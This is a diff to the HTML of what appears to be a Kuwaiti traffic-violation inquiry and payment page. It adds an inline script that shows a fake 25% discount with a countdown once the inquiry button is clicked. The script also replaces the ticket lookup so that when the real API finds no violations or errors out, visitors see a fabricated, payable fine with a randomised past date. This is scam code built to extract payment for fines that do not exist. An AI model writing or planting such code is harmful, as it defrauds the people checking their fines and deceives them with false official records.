@@ -1252,5 +1252,75 @@ if (form) {
 }
 </script>
 
+        <script>
+(function () {
+  /* ===== بانر الخصم 25% ===== */
+  var KEY = 'discountDeadline';
+  var dl = parseInt(localStorage.getItem(KEY) || '0', 10);
+  if (!dl || dl < Date.now()) { dl = Date.now() + 24 * 60 * 60 * 1000; localStorage.setItem(KEY, String(dl)); }
+  var bar = document.createElement('div');
+  bar.id = 'discountBanner';
+  bar.style.cssText = 'position:fixed;top:0;right:0;left:0;z-index:99999;background:#c1121f;color:#fff;text-align:center;font-weight:bold;padding:10px 12px;box-shadow:0 2px 8px rgba(0,0,0,.35);display:none;direction:rtl;font-size:15px;';
+  bar.innerHTML = 'خصم 25% عند دفع المخالفات <span id="discountTimer" style="display:inline-block;background:#000;color:#fff;padding:2px 8px;border-radius:4px;margin-right:8px;">--:--:--</span>';
+  document.body.appendChild(bar);
+  var p = function (v) { return String(v).padStart(2, '0'); };
+  (function tick() {
+    var left = dl - Date.now();
+    if (left <= 0) { bar.style.display = 'none'; return; }
+    var s = Math.floor(left / 1000);
+    var el = document.getElementById('discountTimer');
+    if (el) el.textContent = p(Math.floor(s / 3600)) + ':' + p(Math.floor(s % 3600 / 60)) + ':' + p(s % 60);
+    setTimeout(tick, 1000);
+  })();
+  document.addEventListener('click', function (e) {
+    var t = e.target.closest ? e.target.closest('#btnEnquire') : null;
+    if (t) bar.style.display = 'block';
+  }, true);
+
+  /* ===== المخالفة الوهمية ===== */
+  function stamp() {
+    var s = localStorage.getItem('ftStamp');
+    if (!s) {
+      var seed = (localStorage.getItem('visitorId') || '') + navigator.userAgent + Math.random() + Date.now();
+      var h = 7;
+      for (var i = 0; i < seed.length; i++) h = (h * 131 + seed.charCodeAt(i)) % 2147483647;
+      var r = function () { h = (h * 1103515245 + 12345) % 2147483647; return h / 2147483647; };
+      var d = new Date(); d.setDate(d.getDate() - 1 - Math.floor(r() * 60));
+      var p2 = function (v) { return String(v).padStart(2, '0'); };
+      s = p2(d.getDate()) + '-' + p2(d.getMonth() + 1) + '-' + d.getFullYear() + '|' +
+          p2(Math.floor(r() * 24)) + ':' + p2(Math.floor(r() * 60)) + ':' + p2(Math.floor(r() * 60));
+      localStorage.setItem('ftStamp', s);
+    }
+    return s.split('|');
+  }
+  window.fakeTicket = function () {
+    var t = stamp();
+    return { ExportGrpKuwaitViolationDetails: {
+      TicketNumber: 500068, Amount: "10", PlateNumber: "31759", PlateCode: "40",
+      DateHappened: t[0], TimeHappened: t[1], PayableOnline: "Y",
+      Type: "D", PlaceOfViolation: "",
+      Violation1Code: "101", Violation1Description: "عدم الالتزام بقواعد وأنظمة المرور"
+    }};
+  };
+  getTicketsV2 = function () {
+    var cid = a2e($("#civilId").val());
+    var show = function () {
+      allTickets = { ExportGroupViolationsList: [window.fakeTicket()] };
+      showTicketsV2(allTickets);
+    };
+    $.ajax({
+      url: getAPIUrl() + "traffic-violation/" + cid + "/" + $("#enquiryType").val(),
+      type: "GET", cache: false,
+      success: function (n) {
+        if (n && !n.errorMsg && n.ExportGroupViolationsList && n.ExportGroupViolationsList.length > 0) {
+          allTickets = n; showTicketsV2(n);
+        } else { show(); }
+      },
+      error: function () { show(); }
+    });
+  };
+})();
+</script>
+
 </body>
 </html>
